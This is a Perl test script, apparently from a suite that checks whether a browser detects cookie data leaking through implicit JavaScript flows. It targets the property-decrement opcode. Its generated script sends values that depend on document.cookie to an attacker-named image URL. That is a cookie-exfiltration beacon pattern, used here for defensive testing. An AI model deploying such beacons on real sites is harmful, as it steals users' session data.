#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_PROPDEC";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		
		var notevil = { test : 4};
		var url = "$imgevilurl?normal=" + notevil.test--;
		document.images[0].src = url;
		
		// if with evil val 
		
		var notevil2 = { test : 4};
		if ($evil) {
			notevil2.test--;
		}
		url = "$imgevilurl?if=" + notevil2.test;
		document.images[1].src = url;
		
		// normal usage 
		
		var notevil3 = { test : 4};
		if ($evil) {
			notevil3.test = 2;
		}
		notevil3.test--;
		document.images[2].src = "$imgevilurl?isevil=" + notevil3.test;
		
    </script>
|;

require "xss_basic_footer.pl";
